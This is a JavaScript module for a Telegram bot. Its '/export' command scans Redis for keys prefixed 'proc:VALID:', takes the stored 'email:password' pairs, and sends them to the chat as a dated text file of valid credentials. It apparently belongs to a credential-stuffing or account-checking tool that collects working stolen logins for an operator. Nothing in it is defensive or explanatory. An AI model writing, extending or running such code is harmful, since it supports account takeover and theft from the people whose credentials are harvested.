/**
 * =============================================================================
 * EXPORT HANDLER - Export valid credentials from Redis
 * =============================================================================
 */

const { createLogger } = require('../logger');
const { escapeV2, codeV2, boldV2 } = require('./messages');

const log = createLogger('export');

/**
 * Export valid credentials from Redis.
 * @param {Object} redisClient - Redis client instance
 * @returns {Promise<{credentials: Array<{cred: string, ts: number}>, count: number}>}
 */
async function exportValidFromRedis(redisClient) {
  if (!redisClient) {
    throw new Error('Redis client not available');
  }

  const credentials = [];
  const pattern = 'proc:VALID:*';
  let cursor = '0';

  log.info('Scanning Redis for VALID credentials...');

  // Use SCAN to iterate through all matching keys (memory-efficient)
  do {
    const [newCursor, keys] = await redisClient.scan(cursor, 'MATCH', pattern, 'COUNT', 1000);
    cursor = newCursor;

    if (keys.length > 0) {
      // Get timestamps for all keys in batch
      const values = await redisClient.mget(...keys);

      for (let i = 0; i < keys.length; i++) {
        const key = keys[i];
        const ts = parseInt(values[i], 10) || Date.now();

        // Extract credential from key: proc:VALID:email:password
        // Remove "proc:VALID:" prefix
        const cred = key.replace(/^proc:VALID:/, '');
        
        if (cred) {
          credentials.push({ cred, ts });
        }
      }
    }
  } while (cursor !== '0');

  log.info(`Found ${credentials.length} VALID credentials`);

  // Sort by timestamp descending (latest first)
  credentials.sort((a, b) => b.ts - a.ts);

  return { credentials, count: credentials.length };
}

/**
 * Format credentials as text file content.
 * @param {Array<{cred: string, ts: number}>} credentials
 * @returns {string}
 */
function formatCredentialsAsText(credentials) {
  const lines = [];
  
  // Header
  lines.push(`# Valid Credentials Export`);
  lines.push(`# Generated: ${new Date().toISOString()}`);
  lines.push(`# Total: ${credentials.length}`);
  lines.push(`# Format: email:password`);
  lines.push('');

  // Credentials (latest first)
  for (const { cred } of credentials) {
    lines.push(cred);
  }

  return lines.join('\n');
}

/**
 * Build export success message.
 * @param {number} count - Number of credentials exported
 * @returns {string}
 */
function buildExportSuccess(count) {
  return (
    `✅ ${boldV2('Export Complete')}\n\n` +
    `📊 Total: ${codeV2(String(count))} valid credentials\n` +
    `📅 Sorted: Latest first`
  );
}

/**
 * Build export empty message.
 * @returns {string}
 */
function buildExportEmpty() {
  return escapeV2('ℹ️ No valid credentials found in Redis.');
}

/**
 * Build export error message.
 * @param {string} message - Error message
 * @returns {string}
 */
function buildExportError(message) {
  return `❌ ${boldV2('Export Failed')}\n\n${escapeV2(message)}`;
}

/**
 * Register export command handler.
 * @param {Telegraf} bot - Telegraf bot instance
 * @param {Function} getRedisClient - Function to get Redis client
 */
function registerExportHandler(bot, getRedisClient) {
  bot.command('export', async (ctx) => {
    const chatId = ctx.chat.id;
    
    log.info(`[export] requested by chatId=${chatId}`);

    // Send processing message
    const statusMsg = await ctx.reply(escapeV2('⏳ Exporting valid credentials from Redis...'), {
      parse_mode: 'MarkdownV2',
    });

    try {
      const redisClient = getRedisClient();
      
      if (!redisClient) {
        await ctx.telegram.editMessageText(
          chatId,
          statusMsg.message_id,
          undefined,
          buildExportError('Redis is not connected. Export only works with Redis backend.'),
          { parse_mode: 'MarkdownV2' }
        );
        return;
      }

      const { credentials, count } = await exportValidFromRedis(redisClient);

      if (count === 0) {
        await ctx.telegram.editMessageText(
          chatId,
          statusMsg.message_id,
          undefined,
          buildExportEmpty(),
          { parse_mode: 'MarkdownV2' }
        );
        return;
      }

      // Generate file content
      const content = formatCredentialsAsText(credentials);
      const filename = `valid_${new Date().toISOString().slice(0, 10)}_${count}.txt`;

      // Delete status message
      try {
        await ctx.telegram.deleteMessage(chatId, statusMsg.message_id);
      } catch (_) {}

      // Send file
      await ctx.replyWithDocument(
        { source: Buffer.from(content, 'utf8'), filename },
        {
          caption: buildExportSuccess(count),
          parse_mode: 'MarkdownV2',
        }
      );

      log.info(`[export] completed: ${count} credentials exported`);
    } catch (err) {
      log.error(`[export] failed: ${err.message}`);
      
      try {
        await ctx.telegram.editMessageText(
          chatId,
          statusMsg.message_id,
          undefined,
          buildExportError(err.message),
          { parse_mode: 'MarkdownV2' }
        );
      } catch (_) {
        await ctx.reply(buildExportError(err.message), { parse_mode: 'MarkdownV2' });
      }
    }
  });

  log.info('Export handler registered');
}

module.exports = {
  registerExportHandler,
  exportValidFromRedis,
  formatCredentialsAsText,
  buildExportSuccess,
  buildExportEmpty,
  buildExportError,
};
